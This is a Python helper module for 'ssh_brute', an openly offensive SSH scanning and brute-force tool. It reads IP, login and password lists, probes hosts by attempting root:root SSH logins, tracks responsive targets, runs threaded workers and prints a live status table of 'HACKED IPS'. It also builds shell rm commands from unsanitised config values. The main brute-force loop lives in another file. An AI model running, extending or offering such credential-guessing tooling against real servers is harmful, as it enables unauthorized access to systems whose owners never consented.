import threading
import paramiko
import argparse
import os

def get_parser(env) -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        prog='ssh_brute', 
        description='SSH scanning and bruteforce tool', 
        epilog='made by fyx1t'
        )

    parser.add_argument(
        "-v", 
        "--version", 
        action="version",
        version=f"{env['VERSION']}",
        help="show the version of this program and exit"
    )
    parser.add_argument(
        "-i", 
        "--ip_file",
        action="store",
        required=True,
        help='name of the file with ip addresses or domain names'
    )
    parser.add_argument(
        "-l", 
        "--logins_file",
        action="store",
        required=False,
        help='name of the file with logins'
    )
    parser.add_argument(
        "-p", 
        "--passwords_file",
        action="store",
        required=False,
        help='name of the file with passwords'
    )
    # scan, brute, all
    parser.add_argument(
        "-m", 
        "--mode",
        action="store",
        default='all',
        required=False,
        help='script mode (scan, brute, all)'
    )
    
    return parser

def check_for_good_ips(ips, env) -> list:
    good_ips = []
    for ip in ips:
        print(f'[INFO] TRYING {ip}')
        if ping_port(ip, env):
            good_ips.append(ip)
            print(f'[INFO] FOUND!')
            with open(f'{env["OUTPUT_FOLDER"]}{env["FILENAME_GOOD_IPS"]}', 'a') as good_ips_file:
                good_ips_file.write(ip + '\n')
        else:
            print('[INFO] NO ANSWER...')
    return good_ips

def get_ips(env, arguments) -> list:
    ips = []
    with open(f'{arguments.ip_file}', 'r') as ips_file:
        ips = ips_file.read().split('\n')
            
    return ips

def get_good_ips(env) -> list:
    pre_ips = []
    with open(f'{env["OUTPUT_FOLDER"]}{env["FILENAME_GOOD_IPS"]}', 'r') as ips_file:
        pre_ips = ips_file.read().split('\n')
    
    ips = []
    for i in range(len(pre_ips)):
        if pre_ips[i] != '':
            ips.append(pre_ips[i])
    
    return ips

def ping_port(ip, env) -> bool:
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(
            hostname=ip,
            port=int(env['PORT']),
            username='root',
            password='root',
            timeout=int(env['TIMEOUT'])
        )
    except paramiko.ssh_exception.NoValidConnectionsError:
        return False
    except paramiko.ssh_exception.AuthenticationException or paramiko.ssh_exception.BadAuthenticationType or paramiko.ssh_exception.PasswordRequiredException:
        return True
    except Exception:
        return False
    else:       
        client.close()
        return True

def prepare(ENV, arguments):
    threads = Threads(ENV['THREADS'])

    LOGINS: list = []
    PASSWORDS: list = []
    with open(f'{arguments.logins_file}', 'r') as logins_file:
        for line in logins_file:
            LOGINS.append(line.replace('\n', ''))

    with open(f'{arguments.passwords_file}', 'r') as passwords_file:
        for line in passwords_file:
            PASSWORDS.append(line.replace('\n', ''))

    print('[INFO] CREDENTIONALS ARE LOADED')

    current_work_ips: list = [[] for i in range(ENV['THREADS'])]
    current_creds: list = ['' for i in range(ENV['THREADS'])]
    worked_ips: list = []
    good_ips: list = []
    
    os.system(f'rm -f {ENV["OUTPUT_FOLDER"]}{ENV["FILENAME_FOUND_IPS"]}; touch {ENV["OUTPUT_FOLDER"]}{ENV["FILENAME_FOUND_IPS"]}')
    os.system(f'rm -f {ENV["OUTPUT_FOLDER"]}{ENV["FILENAME_FOUND_IPS_EXTENDED"]}; touch {ENV["OUTPUT_FOLDER"]}{ENV["FILENAME_FOUND_IPS_EXTENDED"]}')
    os.system(f'rm -f {ENV["OUTPUT_FOLDER"]}{ENV["FILENAME_ERRORS"]}; touch {ENV["OUTPUT_FOLDER"]}{ENV["FILENAME_ERRORS"]}')
    
    return LOGINS, PASSWORDS, threads, current_work_ips, current_creds, worked_ips, good_ips

def show_brute_statistics(current_work_ips, current_creds, worked_ips, good_ips, ips, ENV):
    os.system('clear')
    print('ssh_brute by fyx1t\n')
    print('[INFO] Ctrl+c OR Ctrl+z to interrupt process')

    if len(ips) < ENV['THREADS']:
        print('[WARNING] There are one or more threads that do not have an address list (you may have specified more threads than addresses)')
        index_error_threads_ids = [i for i in range(len(ips), ENV['THREADS'])]

    print('\n')

    print(f"{'ID':<7} {'PROCESS':<18} {'IP':<16} CREDS")

    for j in range(len(current_work_ips)):
        try:
            print(f"{str(j+1):<7} {str(current_work_ips[j][1][0])} of {str(current_work_ips[j][1][1]):<7} {current_work_ips[j][0]:<20} {current_creds[j][0]}:{current_creds[j][1]}")
        except IndexError as error:
            print(error)
    if len(ips) < ENV['THREADS']:
        if len(index_error_threads_ids) == 1:
            print(f"Thread {index_error_threads_ids[0]+1} does not contain addresses")
        else:
            print(f"Threads {index_error_threads_ids[0]+1}:{index_error_threads_ids[-1]+1} does not contain addresses")
    print(f'\n-----\n\nCHECKED IPS: {worked_ips}')
    print(f'\nHACKED IPS: {good_ips}')

class Threads:
    def __init__(self, count) -> None:
        self.threads: list = []
        self.jobs: list = []
        self.count = count

    def run(self):
        for i in range(self.count):
            if len(self.jobs[i]) == 5:
                self.threads.append(
                    threading.Thread(target=self.jobs[i][0], args=(self.jobs[i][1], self.jobs[i][2], self.jobs[i][3], self.jobs[i][4]))
                )
            else:
                self.threads.append(
                    threading.Thread(target=self.jobs[i][0], args=(self.jobs[i][1], self.jobs[i][2]))
                )
        for thread in self.threads:
            thread.start()
        for thread in self.threads:
            thread.join()

if __name__ == '__main__':
    print('[WARNING] PLEASE LAUNCH ssh_brute.py')
